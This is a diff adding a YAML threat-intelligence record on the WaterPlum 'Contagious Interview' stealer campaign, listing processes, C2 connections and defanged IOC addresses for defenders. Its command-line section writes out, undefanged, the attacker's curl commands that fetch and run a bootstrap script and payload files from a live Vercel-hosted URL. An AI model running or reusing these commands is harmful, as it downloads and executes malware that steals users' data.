@@ -1,0 +1,49 @@
+title: WaterPlumContagious Interview
+description: The report discusses the WaterPlum malware family and its components
+  including a downloader, stealer module, and communication with C2 servers.
+attribution: ''
+malware_families:
+- StealerRAT
+cves: []
+ttps:
+  processes:
+  - cmd.exe
+  - vscode-bootstrap.cmd
+  command_lines:
+  - curl --ssl-no-revoke -L -o "%VSCODE_DIR%\vscode-bootstrap.cmd" "https://tasksettingsnew.vercel.app/api/settings/bootstrap"
+  - cls"%VSCODE_DIR%\vscode-bootstrap.cmd"cls
+  - curl --ssl-no-revoke -s -L -o "%CODEPROFILE%\env.npl" "https://tasksettingsnew.vercel.app/api/settings/env"
+  - curl --ssl-no-revoke -s -L -o "%CODEPROFILE%\package.json" "https://tasksettingsnew.vercel.app/api/settings/package"
+  powershell: []
+  scripts:
+  - '{[Text.Encoding]::UTF8.GetString(...)}'
+  registry_keys: []
+  image_loads: []
+  network_connections:
+  - vscode-bootstrap.cmd -> 147[.]124.202.208:3000
+  - vscode-bootstrap.cmd -> 147[.]124.202.208:3000
+  - vscode-bootstrap.cmd -> 147[.]124.202.208:3000
+  - vscode-bootstrap.cmd -> 147[.]124.202.208:3000
+  file_activity:
+  - '%VSCODE_DIR%\vscode-bootstrap.cmd'
+  - '%CODEPROFILE%\env.npl'
+  - '%CODEPROFILE%\package.json'
+  persistence: []
+  process_relations: []
+iocs:
+  hashes: []
+  ip_addresses:
+  - 185[.]163.125.196
+  - 147[.]124.202.208
+  - 163[.]245.194.216
+  - 66[.]235.168.136
+  - 87[.]236.177.9
+  domains: []
+  urls:
+  - hxxp://147[.]124.202.208:3000/api/errorMessage
+  - hxxp://147[.]124.202.208:3000/api/handleErrors
+  - hxxp://147[.]124.202.208:3000/
+authors: []
+reference: https://jp.security.ntt/insights_resources/tech_blog/stoatwaffle_malware
+date_of_publication: March 17, 2026
+file_creation_date: May 01, 2026
